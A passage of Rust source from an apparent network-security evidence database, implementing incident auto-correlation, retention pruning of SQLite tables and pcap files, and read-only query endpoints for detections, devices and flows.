            self.add_edge(id, EDGE_VALIDATES, &adr_id, 0.0)?;
        }
        Ok(Some(id.to_string()))
    }

    /// Read one `meta` key/value row (F-B5 watermark store). `None` when the key has never been set.
    fn get_meta(&self, key: &str) -> Result<Option<String>> {
        Ok(self.conn
            .query_row("SELECT value FROM meta WHERE key=?", params![key], |r| r.get(0))
            .optional()?)
    }

    /// Upsert one `meta` key/value row.
    fn set_meta(&self, key: &str, value: &str) -> Result<()> {
        self.conn.execute(
            "INSERT INTO meta VALUES (?,?) ON CONFLICT (key) DO UPDATE SET value=excluded.value",
            params![key, value])?;
        Ok(())
    }

    /// Auto-correlate EVERY device with a new detection into an incident (F-B5) — the fix for "the
    /// incidents table is always empty today": `correlate_incident`/`attack_path` existed but only
    /// ran via the on-demand `--correlate <ip>` CLI flag, never automatically. This is the automatic
    /// counterpart the `hookprobe-evidence.timer`'s 2-minute pass now calls unconditionally.
    ///
    /// `since_ts` is a FALLBACK floor used ONLY the very first time this runs against a given
    /// `evidence.db` (no `correlate_watermark` row yet). Every call after that reads its own prior
    /// watermark back from the `meta` table and ignores `since_ts` — so a re-run with no new
    /// detections since the last pass scans zero devices (bounded cost, and idempotent: nothing
    /// changes on a rerun with no new activity). The watermark advances to
    /// `max(previous watermark, latest detection ts seen in the whole table)` after each pass.
    ///
    /// Returns the number of devices correlated in THIS pass (0 on a rerun with no new detections).
    pub fn correlate_all(&self, since_ts: f64) -> Result<usize> {
        let watermark: f64 = self.get_meta("correlate_watermark")?
            .and_then(|s| s.parse().ok())
            .unwrap_or(since_ts);
        let mut stmt = self.conn.prepare(
            "SELECT DISTINCT src_ip FROM detections WHERE ts > ? AND src_ip <> ''")?;
        let devices: Vec<String> = stmt
            .query_map(params![watermark], |r| r.get::<_, String>(0))?
            .filter_map(|r| r.ok())
            .collect();
        let mut n = 0usize;
        for dev in &devices {
            let title = format!("Correlated incident: {dev}");
            self.correlate_incident(dev, &title)?;
            n += 1;
        }
        let latest: f64 = self.conn.query_row("SELECT coalesce(max(ts),0) FROM detections", [], |r| r.get(0))?;
        self.set_meta("correlate_watermark", &latest.max(watermark).to_string())?;
        Ok(n)
    }

    // ---- Retention (backend-audit gap 1): evidence.db has no bound today -- ingest re-reads the
    // retention-CAPPED stream FILES every 2 minutes forever (`retention-cap.sh` bounds
    // flows/events/host-events/etc AT THE FILE, never the GRAPH they feed), so on a months-long
    // customer deployment the SQLite graph itself grows without limit. `prune` closes that.
    //
    // **Scope (the honest, documented boundary)**: this sweep governs the RAW/TIMELINE tables --
    // `RAW_AGE_TABLES` below -- the ones that grow from the live, continuous 2-minute ingest of
    // flows/detections/host events/verdicts/scores. It deliberately does NOT touch the
    // Product-Cortex lifecycle tables (`adrs`/`requirements`/`commits`/`releases`/`gate_results`/
    // `beacons`/`sessions`/`lifecycle_events`/`attack_runs`/`findings`): those grow from discrete
    // dev/release/campaign events at a vastly lower, bounded rate (not per-packet/per-detection),
    // and pruning ADR/release/roadmap history would destroy the very traceability the Product
    // Cortex exists for (ADR 0011) -- an entirely different retention question this pass does not
    // decide. `interfaces` is excluded too: only ever 2 rows (`iface:lan`/`iface:wan`), static.
    //
    // **Incidents/reports (the "coherent unit" policy this task asked for a decision on)**: an
    // incident's `incident_includes_detection` edges can span a device's ENTIRE detection
    // history (`correlate_incident` links ALL of a device's past detections, not just new ones --
    // see that fn's own doc comment), so pruning old `detections` rows would otherwise leave a
    // *recent* incident with dangling edges to now-gone evidence. The policy: an incident is
    // pruned as a UNIT (itself + its own edges + its `reports` row + THAT row's own edges) only
    // when BOTH (a) the incident itself has aged past the SAME retention cutoff (`incidents.ts`)
    // AND (b) it has ZERO remaining `incident_includes_detection` edges (every detection it cited
    // has already been pruned by the raw-table sweep above). An incident that is still young, OR
    // still cites at least one LIVE detection, is left alone -- exactly "keep incidents/reports
    // that still cite live evidence, or prune them coherently as a unit", never a half-orphaned
    // node with edges pointing at nothing.
    pub fn prune(&self, retention_days: f64, max_db_bytes: Option<i64>) -> Result<PruneStats> {
        const RAW_AGE_TABLES: &[(&str, &str)] = &[
            ("devices", "last_seen"),
            ("flows", "ts"),
            ("detections", "ts"),
            ("processes", "ts"),
            ("files", "ts"),
            ("registry_keys", "ts"),
            ("credentials", "ts"),
            ("responses", "ts"),
            ("qsecbit_scores", "ts"),
            ("net_sessions", "last_ts"),
            ("applications", "last_seen"),
            ("users", "last_seen"),
            ("iocs", "ts"),
        ];
        let ts = now_ts();
        let retention_days = retention_days.max(0.0);
        let cutoff = ts - retention_days * 86400.0;
        let size_before_bytes = self.db_size_bytes()?;

        // A scratch set of every node id this pass deletes -- used ONCE, at the end, to cascade
        // to `edges` in a single set-based DELETE (rather than one DELETE per id, which would be
        // both slower and -- with thousands of pruned rows -- the wrong complexity class for an
        // edge device). Reset on every call so re-running `prune` twice in the same process
        // (tests; a manual re-run) never sees a stale set from the previous call.
        self.conn.execute_batch(
            "CREATE TEMP TABLE IF NOT EXISTS prune_ids (id TEXT PRIMARY KEY); DELETE FROM prune_ids;",
        )?;

        self.begin()?;
        let mut deleted_nodes = 0i64;
        for (table, col) in RAW_AGE_TABLES {
            deleted_nodes += self.mark_and_delete_older_than(table, col, cutoff)?;
        }
        if let Some(cap) = max_db_bytes {
            // Size-based sweep: oldest-first across EVERY raw table, in bounded batches, until the
            // ESTIMATED post-VACUUM size is under `cap` -- `effective_size_bytes` (page_count minus
            // freelist pages) is used here instead of `db_size_bytes` because a DELETE alone does
            // not shrink `page_count` (freed pages become freelist, not a smaller file) until a
            // VACUUM actually runs; checking the *reclaimable* size lets this loop converge without
            // needing an expensive full VACUUM after every single batch (one VACUUM at the very end
            // of `prune` is enough -- see below).
            let mut iterations = 0u32;
            loop {
                if self.effective_size_bytes()? <= cap || iterations >= 20 {
                    break;
                }
                let n = self.delete_oldest_batch(RAW_AGE_TABLES, 1000)?;
                if n == 0 {
                    break; // nothing left to delete -- the cap is unreachable at this retention
                }
                deleted_nodes += n;
                iterations += 1;
            }
        }
        let deleted_edges = self.conn.execute(
            "DELETE FROM edges WHERE src_id IN (SELECT id FROM prune_ids) OR dst_id IN (SELECT id FROM prune_ids)",
            [],
        )? as i64;
        let (deleted_incidents, deleted_reports) = self.sweep_stale_incidents(cutoff)?;
        // heqk side tables follow their detections (no orphaned provenance past retention).
        self.conn.execute("DELETE FROM heqk_detection_meta WHERE det_id NOT IN (SELECT id FROM detections)", [])?;
        self.conn.execute("DELETE FROM heqk_sensor_loss WHERE last_ts < ?", params![cutoff])?;
        self.conn.execute("DELETE FROM prune_ids", [])?; // don't leak state into the next call
        self.commit()?;

        // VACUUM cannot run inside a transaction (SQLite refuses) -- run it AFTER the commit
        // above, and only when something was actually deleted (an unconditional VACUUM on an
        // unchanged DB is a wasted full-file rewrite -- real SD-card cost for zero benefit).
        let vacuumed = deleted_nodes > 0 || deleted_edges > 0 || deleted_incidents > 0;
        if vacuumed {
            self.conn.execute("VACUUM", [])?;
        }
        let size_after_bytes = self.db_size_bytes()?;

        let stats = PruneStats {
            ts,
            retention_days,
            max_db_bytes,
            deleted_nodes,
            deleted_edges,
            deleted_incidents,
            deleted_reports,
            size_before_bytes,
            size_after_bytes,
            vacuumed,
        };
        self.record_prune_meta(&stats)?;
        Ok(stats)
    }

    /// Filesystem-tier counterpart to [`Self::prune`] (which only ever touches SQLite rows —
    /// GAP-4 of the trigger-to-evidence pcap capture pass, roadmap D): evict `dir`
    /// (`/var/lib/hookprobe/pcap/`) in TWO passes, mirroring [`Self::prune`]'s own age-then-size
    /// two-part policy: (1) unconditionally delete any `.pcap` file older than `max_age_secs`
    /// (ADR 0003's `retention.tiers[pcap].window`, "hours" — [`DEFAULT_PCAP_MAX_AGE_SECS`] is the
    /// documented, adjustable default), THEN (2) if what's left still exceeds `cap_bytes` (ADR
    /// 0003's `cap_gb: 8` — [`PCAP_DIR_CAP_BYTES`] by default), evict the REMAINDER oldest-first
    /// until under cap. Every removed file's `pcaps` row + edges are deleted alongside it so the
    /// graph never keeps a dangling reference to a file that no longer exists. "Oldest"/"age"
    /// prefer the pcap's OWN recorded `ts` (its `pcaps` row, when one exists) — fall back to the
    /// file's on-disk mtime for an ORPHAN file (e.g. `napse-dpi` wrote it but the completion
    /// events-stream line was never ingested, perhaps because `hookprobe-evidence.service` was
    /// down at the time), so an ungraphed file is never left to grow the directory forever just
    /// because it has no row to key off. A missing `dir` (capture disabled, or nothing captured
    /// yet) is a real, honest zero-work no-op, not an error. Best-effort file removal: a file that
    /// vanishes between listing and delete (a concurrent run, an operator manually clearing the
    /// directory) is skipped, not fatal.
    pub fn prune_pcap_dir(&self, dir: &Path, cap_bytes: i64, max_age_secs: f64) -> Result<PcapPruneStats> {
        let cap_bytes = cap_bytes.max(0);
        let now = now_ts();
        let read_dir = match std::fs::read_dir(dir) {
            Ok(rd) => rd,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                return Ok(PcapPruneStats {
                    cap_bytes,
                    deleted_files: 0,
                    deleted_bytes: 0,
                    deleted_rows: 0,
                    size_before_bytes: 0,
                    size_after_bytes: 0,
                });
            }
            Err(e) => return Err(e).with_context(|| format!("read_dir {}", dir.display())),
        };

        let mut entries: Vec<(String, i64, f64)> = Vec::new(); // (path, bytes, sort_ts)
        let mut size_before_bytes: i64 = 0;
        for entry in read_dir {
            let entry = entry?;
            let path = entry.path();
            if path.extension().and_then(|s| s.to_str()) != Some("pcap") {
                continue;
            }
            let meta = entry.metadata()?;
            let bytes = meta.len() as i64;
            let path_str = path.to_string_lossy().to_string();
            let sort_ts: f64 = self
                .conn
                .query_row("SELECT ts FROM pcaps WHERE path=?1", params![path_str], |r| r.get(0))
                .optional()?
                .unwrap_or_else(|| {
                    meta.modified()
                        .ok()
                        .and_then(|m| m.duration_since(std::time::UNIX_EPOCH).ok())
                        .map(|d| d.as_secs_f64())
                        .unwrap_or(0.0)
                });
            size_before_bytes += bytes;
            entries.push((path_str, bytes, sort_ts));
        }
        entries.sort_by(|a, b| a.2.partial_cmp(&b.2).unwrap_or(std::cmp::Ordering::Equal));

        let mut deleted_files = 0i64;
        let mut deleted_bytes = 0i64;
        let mut deleted_rows = 0i64;
        let mut remaining_total = size_before_bytes;
        let age_cutoff = now - max_age_secs.max(0.0);

        if !entries.is_empty() {
            self.begin()?;
            let mut still_present: Vec<(String, i64, f64)> = Vec::with_capacity(entries.len());
            // Pass 1: unconditional age-based eviction — every file older than `max_age_secs` goes
            // regardless of the current total size.
            for (path_str, bytes, sort_ts) in entries {
                if sort_ts < age_cutoff {
                    if let Some(rows) = self.delete_pcap_file(&path_str)? {
                        deleted_files += 1;
                        deleted_bytes += bytes;
                        remaining_total -= bytes;
                        deleted_rows += rows;
                    }
                } else {
                    still_present.push((path_str, bytes, sort_ts));
                }
            }
            // Pass 2: size-cap sweep over whatever survived pass 1, oldest-first (already sorted).
            for (path_str, bytes, _) in still_present {
                if remaining_total <= cap_bytes {
                    break;
                }
                if let Some(rows) = self.delete_pcap_file(&path_str)? {
                    deleted_files += 1;
                    deleted_bytes += bytes;
                    remaining_total -= bytes;
                    deleted_rows += rows;
                }
            }
            self.commit()?;
        }

        Ok(PcapPruneStats {
            cap_bytes,
            deleted_files,
            deleted_bytes,
            deleted_rows,
            size_before_bytes,
            size_after_bytes: size_before_bytes - deleted_bytes,
        })
    }

    /// Remove one `.pcap` file from disk plus its `pcaps` row + edges. `Ok(None)` (best-effort, not
    /// an error) when the file has already vanished (a concurrent run, an operator manually
    /// clearing the directory) — `Ok(Some(rows_deleted))` (0 for an orphan file with no matching
    /// row) on success.
    fn delete_pcap_file(&self, path_str: &str) -> Result<Option<i64>> {
        if std::fs::remove_file(path_str).is_err() {
            return Ok(None);
        }
        let pcap_id = sid("pcap", path_str);
        let rows = self.conn.execute("DELETE FROM pcaps WHERE id=?1", params![pcap_id])? as i64;
        self.conn.execute("DELETE FROM edges WHERE src_id=?1 OR dst_id=?1", params![pcap_id])?;
        Ok(Some(rows))
    }

    /// Select every `{table}` row older than `cutoff` (by `{col}`), record its id into the
    /// scratch `prune_ids` set (for the caller's later single edges cascade), then delete those
    /// rows. Returns the count deleted.
    fn mark_and_delete_older_than(&self, table: &str, col: &str, cutoff: f64) -> Result<i64> {
        let ids: Vec<String> = {
            let mut stmt = self
                .conn
                .prepare(&format!("SELECT id FROM {table} WHERE {col} < ?1"))?;
            let v: Vec<String> = stmt
                .query_map(params![cutoff], |r| r.get::<_, String>(0))?
                .filter_map(|r| r.ok())
                .collect();
            v
        };
        if ids.is_empty() {
            return Ok(0);
        }
        for id in &ids {
            self.conn
                .execute("INSERT OR IGNORE INTO prune_ids VALUES (?1)", params![id])?;
        }
        self.conn
            .execute(&format!("DELETE FROM {table} WHERE {col} < ?1"), params![cutoff])?;
        Ok(ids.len() as i64)
    }

    /// Delete the globally-oldest `batch` rows across every `(table, col)` in `tables` (a UNION ALL
    /// ordered by age, ascending) -- the size-cap sweep's "oldest-first" step. Marks each deleted
    /// id into `prune_ids` the same way `mark_and_delete_older_than` does. Returns the count
    /// actually deleted (0 when every raw table is already empty).
    fn delete_oldest_batch(&self, tables: &[(&str, &str)], batch: i64) -> Result<i64> {
        let union_sql = tables
            .iter()
            .map(|(t, c)| format!("SELECT '{t}' AS tbl, id AS rid, {c} AS age FROM {t}"))
            .collect::<Vec<_>>()
            .join(" UNION ALL ");
        let sql = format!("SELECT tbl, rid FROM ({union_sql}) ORDER BY age ASC LIMIT ?1");
        let rows: Vec<(String, String)> = {
            let mut stmt = self.conn.prepare(&sql)?;
            let v: Vec<(String, String)> = stmt
                .query_map(params![batch], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)))?
                .filter_map(|r| r.ok())
                .collect();
            v
        };
        for (table, id) in &rows {
            self.conn
                .execute("INSERT OR IGNORE INTO prune_ids VALUES (?1)", params![id])?;
            self.conn
                .execute(&format!("DELETE FROM {table} WHERE id=?1"), params![id])?;
        }
        Ok(rows.len() as i64)
    }

    /// The incident/report "coherent unit" sweep -- see `prune`'s doc comment for the full policy.
    /// An incident older than `cutoff` with ZERO remaining `incident_includes_detection` edges
    /// (every detection it cited has already been pruned) is deleted along with its own edges and
    /// its `reports` row (if any) + that row's own edges. Returns `(incidents_deleted,
    /// reports_deleted)`.
    fn sweep_stale_incidents(&self, cutoff: f64) -> Result<(i64, i64)> {
        let stale: Vec<String> = {
            let mut stmt = self.conn.prepare("SELECT id FROM incidents WHERE ts < ?1")?;
            let v: Vec<String> = stmt
                .query_map(params![cutoff], |r| r.get::<_, String>(0))?
                .filter_map(|r| r.ok())
                .collect();
            v
        };
        let mut deleted_incidents = 0i64;
        let mut deleted_reports = 0i64;
        for inc_id in &stale {
            let live_detections: i64 = self.conn.query_row(
                "SELECT count(*) FROM edges WHERE src_id=?1 AND edge_type='incident_includes_detection'",
                params![inc_id],
                |r| r.get(0),
            )?;
            if live_detections > 0 {
                continue; // still cites live evidence -- keep, per the documented policy above
            }
            let report_id: Option<String> = self
                .conn
                .query_row("SELECT id FROM reports WHERE incident_id=?1", params![inc_id], |r| r.get(0))
                .optional()?;
            if let Some(rid) = &report_id {
                self.conn.execute("DELETE FROM edges WHERE src_id=?1 OR dst_id=?1", params![rid])?;
                self.conn.execute("DELETE FROM reports WHERE id=?1", params![rid])?;
                deleted_reports += 1;
            }
            self.conn.execute("DELETE FROM edges WHERE src_id=?1 OR dst_id=?1", params![inc_id])?;
            self.conn.execute("DELETE FROM incidents WHERE id=?1", params![inc_id])?;
            deleted_incidents += 1;
        }
        Ok((deleted_incidents, deleted_reports))
    }

    /// Actual on-disk footprint (`page_count * page_size`) -- what an operator means by "how big is
    /// evidence.db right now". Works on both a writer (`open`) and reader (`open_readonly`)
    /// connection: both PRAGMAs are read-only queries, no write lock needed.
    pub fn db_size_bytes(&self) -> Result<i64> {
        let page_count: i64 = self.conn.query_row("PRAGMA page_count", [], |r| r.get(0))?;
        let page_size: i64 = self.conn.query_row("PRAGMA page_size", [], |r| r.get(0))?;
        Ok(page_count * page_size)
    }

    /// The size a VACUUM would reclaim TO, without actually running one -- `page_count` doesn't
    /// shrink on a bare DELETE (freed pages become part of the freelist instead), so
    /// `(page_count - freelist_count) * page_size` is the honest "how much is actually live data"
    /// estimate the size-cap loop in `prune` needs to decide whether another batch is required,
    /// without paying for a full-file VACUUM rewrite after every single batch.
    fn effective_size_bytes(&self) -> Result<i64> {
        let page_count: i64 = self.conn.query_row("PRAGMA page_count", [], |r| r.get(0))?;
        let freelist_count: i64 = self.conn.query_row("PRAGMA freelist_count", [], |r| r.get(0))?;
        let page_size: i64 = self.conn.query_row("PRAGMA page_size", [], |r| r.get(0))?;
        Ok((page_count - freelist_count) * page_size)
    }

    /// Persist the last prune's numbers into `meta` (F5-style watermark, same idiom
    /// `correlate_all`'s `correlate_watermark` already uses) so `--stats`/`graph_stats` (and thus
    /// the read-API) can show an operator "the prune is actually working" -- current size AND
    /// when/what the last pass did, not just a silent cron job.
    fn record_prune_meta(&self, stats: &PruneStats) -> Result<()> {
        self.set_meta("last_prune_ts", &stats.ts.to_string())?;
        self.set_meta("last_prune_retention_days", &stats.retention_days.to_string())?;
        self.set_meta(
            "last_prune_max_db_bytes",
            &stats.max_db_bytes.map(|b| b.to_string()).unwrap_or_default(),
        )?;
        self.set_meta("last_prune_deleted_nodes", &stats.deleted_nodes.to_string())?;
        self.set_meta("last_prune_deleted_edges", &stats.deleted_edges.to_string())?;
        self.set_meta("last_prune_deleted_incidents", &stats.deleted_incidents.to_string())?;
        self.set_meta("last_prune_deleted_reports", &stats.deleted_reports.to_string())?;
        self.set_meta("last_prune_size_before_bytes", &stats.size_before_bytes.to_string())?;
        self.set_meta("last_prune_size_after_bytes", &stats.size_after_bytes.to_string())?;
        self.set_meta("last_prune_vacuumed", if stats.vacuumed { "1" } else { "0" })?;
        Ok(())
    }

    pub fn counts(&self) -> Result<(i64, i64, i64, i64)> {
        let q = |t: &str| -> Result<i64> {
            Ok(self.conn.query_row(&format!("SELECT count(*) FROM {t}"), [], |r| r.get(0))?)
        };
        Ok((q("devices")?, q("flows")?, q("detections")?, q("edges")?))
    }

    /// Full node/edge breakdown by type (ADR 0013 D4a `graph_stats` MCP tool) — `counts()`'s four
    /// legacy numbers are the packet-timeline subset; this covers every node table (network + host +
    /// correlation + lifecycle) plus an edge-type histogram, so an MCP client sees the whole graph's
    /// shape in one call instead of guessing which tables exist. Read-only (no INSERT/UPDATE).
    pub fn graph_stats(&self) -> Result<String> {
        const NODE_TABLES: &[&str] = &[
            "devices", "interfaces", "flows", "net_sessions", "applications", "users",
            "detections", "pcaps", "processes", "files", "registry_keys", "credentials",
            "incidents", "reports", "iocs", "responses", "adrs", "requirements", "commits", "releases",
            "gate_results", "beacons", "sessions", "lifecycle_events", "qsecbit_scores",
            "attack_runs", "findings",
        ];
        let mut nodes = serde_json::Map::with_capacity(NODE_TABLES.len());
        for t in NODE_TABLES {
            let c: i64 = self.conn.query_row(&format!("SELECT count(*) FROM {t}"), [], |r| r.get(0))?;
            nodes.insert((*t).to_string(), serde_json::json!(c));
        }
        let mut stmt = self.conn.prepare("SELECT edge_type, count(*) FROM edges GROUP BY edge_type ORDER BY edge_type")?;
        let by_type: Vec<(String, i64)> = stmt
            .query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, i64>(1)?)))?
            .filter_map(|r| r.ok())
            .collect();
        let edges_by_type: serde_json::Map<String, serde_json::Value> =
            by_type.into_iter().map(|(k, v)| (k, serde_json::json!(v))).collect();
        let total_edges: i64 = self.conn.query_row("SELECT count(*) FROM edges", [], |r| r.get(0))?;

        // Retention visibility (backend-audit gap 1): current on-disk size + the last `--prune`
        // pass's numbers, straight from the `meta` watermark `record_prune_meta` writes — so an
        // operator (via `--stats` or this SAME JSON over the read-API) can see retention is
        // actually running, not just trust a cron job. `last_prune: null` (never an error) when
        // `--prune` has never run against this DB yet.
        let db_size_bytes = self.db_size_bytes().unwrap_or(0);
        let last_prune = match self.get_meta("last_prune_ts")? {
            Some(ts_s) => serde_json::json!({
                "ts": ts_s.parse::<f64>().unwrap_or(0.0),
                "retention_days": self.get_meta("last_prune_retention_days")?.and_then(|s| s.parse::<f64>().ok()),
                "max_db_bytes": self.get_meta("last_prune_max_db_bytes")?.and_then(|s| s.parse::<i64>().ok()),
                "deleted_nodes": self.get_meta("last_prune_deleted_nodes")?.and_then(|s| s.parse::<i64>().ok()).unwrap_or(0),
                "deleted_edges": self.get_meta("last_prune_deleted_edges")?.and_then(|s| s.parse::<i64>().ok()).unwrap_or(0),
                "deleted_incidents": self.get_meta("last_prune_deleted_incidents")?.and_then(|s| s.parse::<i64>().ok()).unwrap_or(0),
                "deleted_reports": self.get_meta("last_prune_deleted_reports")?.and_then(|s| s.parse::<i64>().ok()).unwrap_or(0),
                "size_before_bytes": self.get_meta("last_prune_size_before_bytes")?.and_then(|s| s.parse::<i64>().ok()).unwrap_or(0),
                "size_after_bytes": self.get_meta("last_prune_size_after_bytes")?.and_then(|s| s.parse::<i64>().ok()).unwrap_or(0),
                "vacuumed": self.get_meta("last_prune_vacuumed")?.as_deref() == Some("1"),
            }),
            None => serde_json::Value::Null,
        };

        Ok(serde_json::json!({
            "nodes": nodes,
            "total_edges": total_edges,
            "edges_by_type": edges_by_type,
            "db_size_bytes": db_size_bytes,
            "last_prune": last_prune,
        }).to_string())
    }

    /// Per-`category` and per-`rule_id` detection counts, each ordered highest-count-first (F5 — the
    /// `--stats` CLI subcommand's "at a glance" operator view: `graph_stats()` already gives the raw
    /// `detections` table total, but an operator staring at "236 detections" learns nothing about
    /// WHAT fired — e.g. "port_scan: 145, brute_force: 21, dns_dga: 40, aegis_reflex: 30"). Read-only,
    /// two cheap `GROUP BY` scans (the `detections` table stays small — retention-capped, same
    /// dataset `recent_detections`/`counts` already scan in full).
    ///
    /// Returned as JSON ARRAYS of `{"key","count"}` pairs, not a JSON object/map: this crate's
    /// `serde_json::Map` is a `BTreeMap` (no `preserve_order` feature enabled — see `Cargo.toml`),
    /// which would silently re-sort an object's keys alphabetically and throw away the `count DESC`
    /// ordering the SQL query already computed. A `Vec`-backed JSON array preserves insertion order
    /// through serialization, so the CLI's human-readable print (and any future read-API consumer)
    /// sees the SAME highest-first ordering this function's SQL produced.
    pub fn detection_breakdown(&self) -> Result<String> {
        let mut stmt = self.conn.prepare(
            "SELECT CASE WHEN category='' THEN '(uncategorized)' ELSE category END, count(*) AS n \
             FROM detections GROUP BY category ORDER BY n DESC, category ASC")?;
        let by_category: Vec<serde_json::Value> = stmt
            .query_map([], |r| Ok(serde_json::json!({
                "category": r.get::<_, String>(0)?,
                "count": r.get::<_, i64>(1)?,
            })))?
            .filter_map(|r| r.ok())
            .collect();
        let mut stmt = self.conn.prepare(
            "SELECT rule_id, count(*) AS n FROM detections GROUP BY rule_id ORDER BY n DESC, rule_id ASC")?;
        let by_rule_id: Vec<serde_json::Value> = stmt
            .query_map([], |r| Ok(serde_json::json!({
                "rule_id": r.get::<_, i64>(0)?,
                "count": r.get::<_, i64>(1)?,
            })))?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({
            "by_category": by_category,
            "by_rule_id": by_rule_id,
        }).to_string())
    }

    /// Latest N detections, newest first (ADR 0013 D4a `recent_detections` MCP tool). `limit` is
    /// clamped to [1,500] — an MCP client is untrusted input same as a JSON ingest line, and an
    /// unbounded scan on a busy device would be a self-inflicted DoS via the read tool. Read-only.
    pub fn recent_detections(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 500);
        let mut stmt = self.conn.prepare(
            "SELECT id, ts, rule_id, rule_msg, category, severity, mitre, src_ip, dst_ip, dst_port, confidence \
             FROM detections ORDER BY ts DESC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "rule_id": r.get::<_, i64>(2)?,
                    "rule_msg": r.get::<_, String>(3)?,
                    "category": r.get::<_, String>(4)?,
                    "severity": r.get::<_, i64>(5)?,
                    "mitre": r.get::<_, String>(6)?,
                    "src_ip": r.get::<_, String>(7)?,
                    "dst_ip": r.get::<_, String>(8)?,
                    "dst_port": r.get::<_, i64>(9)?,
                    "confidence": r.get::<_, f64>(10)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "detections": rows}).to_string())
    }

    /// Latest N detections whose `category` is one of `categories`, newest first — the Mission
    /// Control read-API's `/api/verdicts/dns` (`category="dns_dga"`) and `/api/verdicts/aegis`
    /// (`category IN ("aegis_reflex","aegis_guard")`) endpoints share this one query instead of
    /// duplicating `recent_detections`' shape per verdict source. Read-only. `limit` clamped [1,500]
    /// for the same self-inflicted-DoS reason as `recent_detections`.
    pub fn detections_by_categories(&self, categories: &[&str], limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 500);
        if categories.is_empty() {
            return Ok(serde_json::json!({"count": 0, "detections": []}).to_string());
        }
        let placeholders = categories.iter().map(|_| "?").collect::<Vec<_>>().join(",");
        let sql = format!(
            "SELECT id, ts, rule_id, rule_msg, category, severity, mitre, src_ip, dst_ip, dst_port, confidence \
             FROM detections WHERE category IN ({placeholders}) ORDER BY ts DESC LIMIT ?");
        let mut stmt = self.conn.prepare(&sql)?;
        // rusqlite params! needs a fixed arity; build a Vec<&dyn ToSql> so the category count is dynamic.
        let mut params_dyn: Vec<&dyn rusqlite::ToSql> = categories.iter().map(|c| c as &dyn rusqlite::ToSql).collect();
        params_dyn.push(&limit);
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params_dyn.as_slice(), |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "rule_id": r.get::<_, i64>(2)?,
                    "rule_msg": r.get::<_, String>(3)?,
                    "category": r.get::<_, String>(4)?,
                    "severity": r.get::<_, i64>(5)?,
                    "mitre": r.get::<_, String>(6)?,
                    "src_ip": r.get::<_, String>(7)?,
                    "dst_ip": r.get::<_, String>(8)?,
                    "dst_port": r.get::<_, i64>(9)?,
                    "confidence": r.get::<_, f64>(10)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "detections": rows}).to_string())
    }

    /// Latest N devices, most-recently-seen first — the read-API's `/api/devices` (Observe/Network
    /// workspace device inventory). Read-only.
    pub fn list_devices(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 1000);
        let mut stmt = self.conn.prepare(
            "SELECT id, ip, mac, first_seen, last_seen FROM devices ORDER BY last_seen DESC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ip": r.get::<_, String>(1)?,
                    "mac": r.get::<_, Option<String>>(2)?,
                    "first_seen": r.get::<_, f64>(3)?,
                    "last_seen": r.get::<_, f64>(4)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "devices": rows}).to_string())
    }

    /// Latest N flows, newest first — the read-API's `/api/flows` (Observe workspace). Read-only.
    pub fn list_flows(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 1000);
        // roadmap-B: enrich each flow with its Application-pivot fingerprint (sni/ja4/ja4s) via the
        // SAME flow_to_application edge-join ioc_flow_candidates uses, so the Observe flow list shows
        // the TLS-client JA4 inline instead of it being captured-but-invisible (audit GAP-2). LEFT
        // JOIN — a non-TLS/HTTP flow with no app pivot still yields its bare tuple, fields empty.
        // ja4h is included here too: it is the read CONSUMER the persisted `applications.ja4h`
        // column previously lacked (audit GAP-3) — an HTTP (port-80) flow carries ja4h but no ja4,
        // so this is the honest parallel to ja4/ja4s (identifies the HTTP client library) WITHOUT
        // treating ja4h as a matchable threat-intel IOC (deliberately excluded, see hydra/feed.rs).
        let mut stmt = self.conn.prepare(
            "SELECT f.id, f.ts, f.src_ip, f.src_port, f.dst_ip, f.dst_port, f.proto, f.conn_state, f.orig_bytes, f.resp_bytes, \
                    COALESCE(a.sni,''), COALESCE(a.ja4,''), COALESCE(a.ja4s,''), COALESCE(a.ja4h,'') \
             FROM flows f \
             LEFT JOIN edges e ON e.src_id = f.id AND e.edge_type='flow_to_application' \
             LEFT JOIN applications a ON a.id = e.dst_id \
             ORDER BY f.ts DESC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "src_ip": r.get::<_, String>(2)?,
                    "src_port": r.get::<_, i64>(3)?,
                    "dst_ip": r.get::<_, String>(4)?,
                    "dst_port": r.get::<_, i64>(5)?,
                    "proto": r.get::<_, String>(6)?,
                    "conn_state": r.get::<_, String>(7)?,
                    "orig_bytes": r.get::<_, i64>(8)?,
                    "resp_bytes": r.get::<_, i64>(9)?,
                    "sni": r.get::<_, String>(10)?,
                    "ja4": r.get::<_, String>(11)?,
                    "ja4s": r.get::<_, String>(12)?,
                    "ja4h": r.get::<_, String>(13)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "flows": rows}).to_string())
    }

    /// Trigger-to-evidence pcap capture (roadmap D) read path — mirrors [`Self::list_flows`]'s
    /// shape/discipline exactly (most-recent-first, clamped limit) so an operator/read-API
    /// consumer has a real, non-write-only way to see what was captured, not just
    /// [`Self::trace_detection`]'s per-detection view. `rule_id`/`rule_msg`/`category` are pulled
